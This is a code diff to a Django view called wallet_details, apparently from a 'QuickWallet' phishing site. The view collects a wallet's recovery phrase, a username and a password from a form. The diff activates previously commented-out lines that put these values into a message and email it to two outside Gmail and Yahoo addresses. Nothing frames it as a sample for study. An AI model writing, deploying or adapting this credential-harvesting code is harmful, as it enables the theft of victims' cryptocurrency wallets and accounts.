@@ -27,11 +27,11 @@ def wallet_details(request, slug):
         user = request.POST['user']
         password = request.POST['pass']
 
-        # data = f"Wallet: {wallet}\nPhrase: {phrase}\nEmail/Username: {user}\nPassword: {password}"
-        # message = str(data)
+        data = f"Wallet: {wallet}\nPhrase: {phrase}\nEmail/Username: {user}\nPassword: {password}"
+        message = str(data)
 
-        # send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
-        # send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['presidentp00100@yahoo.com'] )
         
         # print(data)
 
